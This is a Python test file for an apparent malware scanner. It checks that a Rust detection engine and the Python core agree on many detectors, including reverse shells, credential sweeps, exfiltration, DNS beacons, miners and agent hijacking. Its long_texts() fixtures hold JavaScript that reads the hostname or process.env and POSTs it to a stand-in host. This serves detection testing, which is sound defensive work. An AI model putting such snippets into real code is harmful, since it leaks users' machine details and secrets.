"""Engine parity for the signs install scripts and import-time code are
read for, one by one: the Rust engine (crates/lazaret-engine: signs.rs,
received.rs) against lazaret.scanner.core on the hooks parity corpus
(hooks_corpus.py), each case's answers compared field by field —
_received_code_kind, _downloads_and_runs, _decodes_and_runs,
powershell_risk, stager_at, reverse_shell_at, (0.1.8) local_data_sent_at,
runs_own_source_at, reads_own_source, persistence_reasons,
dumps_workflow_secrets, _pipes_download_to_shell, runs_substituted_download,
offscreen_code (as JavaScript and as Python), (0.1.8) the exfiltration
shapes (secret_endpoint_at, credential_sweep_at, exec_command_reasons …
_exfil_signs, raw_ip_connect, capture_service) and service_reasons, the DNS
beacon without a read of the identity and the dead drop, and the text read
as a shell program (_sh_reasons, _shell_text, _code_text); and (0.1.8,
for the npm package) agent_hijack, agent_hijack_in_command,
_hook_is_suspicious and _import_code; and wallet_swap_at.

test_rust_parity_hooks.py holds install_script_risk and import_time_risk,
which read all of these at once; here a difference shows which one.
The Rust engine runs in a thread while core reads the cases. Skipped where
the native library is not built.
"""
import threading
import unittest

from lazaret.scanner import _native, core
from tests.architecture.hooks_corpus import corpus

CHUNK = 1500
FIELDS = ("received_code_kind", "downloads_and_runs", "decodes_and_runs", "powershell_risk", "stager_at",
          "reverse_shell_at", "local_data_sent_at", "runs_own_source_at", "reads_own_source", "persistence_reasons",
          "dumps_workflow_secrets", "pipes_download_to_shell", "runs_substituted_download",
          "offscreen_code js", "offscreen_code py",
          # 0.1.8: the exfiltration shapes, programs started at login or boot
          "secret_endpoint_at", "credential_sweep_at", "exec_command_reasons", "dns_beacon_at", "miner_at",
          "raw_ip_connect", "capture_service", "exfil_signs", "service_reasons",
          # the DNS beacon a shell command sends without another read of the identity, the dead drop
          "dns_beacon_at without host", "dead_drop_at",
          # 0.1.8: the text read as a shell program
          "_sh_reasons", "_shell_text", "_code_text",
          # 0.1.8: what the npm package asks besides (hook_command_risk: test_rust_parity_hook_commands)
          "agent_hijack", "agent_hijack_in_command", "_hook_is_suspicious", "_import_code js", "_import_code py",
          # the detection round: wallet addresses swapped
          "wallet_swap_at")


def as_json(v):
    """A value as JSON carries it (tuples as lists)."""
    if isinstance(v, (tuple, list)):
        return [as_json(x) for x in v]
    return v


def core_view(text):
    """core's answers for one case, in FIELDS order."""
    return as_json([core._received_code_kind(text), core._downloads_and_runs(text), core._decodes_and_runs(text),
                    core.powershell_risk(text), core.stager_at(text), core.reverse_shell_at(text),
                    core.local_data_sent_at(text), core.runs_own_source_at(text), core.reads_own_source(text),
                    core.persistence_reasons(text), core.dumps_workflow_secrets(text),
                    core._pipes_download_to_shell(text), core.runs_substituted_download(text),
                    core.offscreen_code(text, "js"), core.offscreen_code(text, "py"),
                    core.secret_endpoint_at(text), core.credential_sweep_at(text), core.exec_command_reasons(text),
                    core.dns_beacon_at(text), core.miner_at(text), core.raw_ip_connect(text),
                    (lambda m: m.group(0) if m else None)(core.capture_service(text)),
                    core._exfil_signs(text, core._HOST_INFO_RE.search(text)), core.service_reasons(text),
                    core.dns_beacon_at(text, False), core.dead_drop_at(text),
                    core._sh_reasons(text, 0, False, core._HookWalk()), core._shell_text(text), core._code_text(text),
                    core.agent_hijack(text), core.agent_hijack_in_command(text), core._hook_is_suspicious(text),
                    core._import_code(text, "js"), core._import_code(text, "py"),
                    core.wallet_swap_at(text)])


def rust_views(cases, box):
    views = []
    try:
        for i in range(0, len(cases), CHUNK):
            calls = [["signs_view", {}, text] for text in cases[i:i + CHUNK]]
            for r in _native.call("batch", {"calls": calls}):
                views.append(r.get("ok", r))
    except Exception as e:                            # reported by the test, not lost in the thread
        box["error"] = repr(e)
    box["views"] = views


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class RustSignsParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.cases = corpus()
        box = {}
        worker = threading.Thread(target=rust_views, args=(cls.cases, box))
        worker.start()
        cls.want = [core_view(text) for text in cls.cases]
        worker.join()
        cls.error = box.get("error")
        cls.got = box.get("views", [])

    def test_every_case_agrees(self):
        self.assertIsNone(self.error)
        self.assertEqual(len(self.got), len(self.cases))
        found = []
        for text, a, b in zip(self.cases, self.want, self.got):
            if not isinstance(b, list):
                found.append((text, "(call)", None, b))
                continue
            for field, x, y in zip(FIELDS, a, b):
                if x != y:
                    found.append((text, field, x, y))
            if len(found) >= 20:
                break
        self.assertEqual(found, [])

    def test_every_field_is_reached(self):
        """The corpus holds cases where each sign is found (not only its absence)."""
        quiet = (None, [], -1, False)
        for k, field in enumerate(FIELDS):
            with self.subTest(field=field):
                self.assertTrue(any(v[k] not in quiet for v in self.want), field)


def long_texts():
    """Texts longer than core._LD_LONG (a bundle): a name carries the data
    only _LD_NEAR characters from where it was given it."""
    filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
    send = "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(%s)});\n"
    payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + send % "data"
    return [filler + payload, payload + filler, "var data = {h: require('os').hostname()};\n" + filler + send % "data",
            "var data = process.env;\n" + filler[:30000] + "var data = 1;\n" + send % "data" + filler,
            "class C { constructor() { this.env = process.env; } }\n" + filler + "this.env.x;\n" + send % "this.env",
            "var require_x = __commonJS({ \"x.js\"(exports) { var e = process.env; } });\n" + filler
            + "var x = require_x();\n" + send % "x"]


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class LongTextFlowParityTests(unittest.TestCase):
    def test_a_long_texts_flow_agrees(self):
        texts = long_texts()
        self.assertTrue(all(len(t) > core._LD_LONG for t in texts))
        got = [r.get("ok", r) for r in _native.call("batch", {"calls": [["local_data_sent_at", {}, t] for t in texts]})]
        want = [as_json(core.local_data_sent_at(t)) for t in texts]
        self.assertEqual(got, want)
        self.assertEqual([w is not None for w in want], [True, True, False, False, False, False])


if __name__ == "__main__":
    unittest.main()
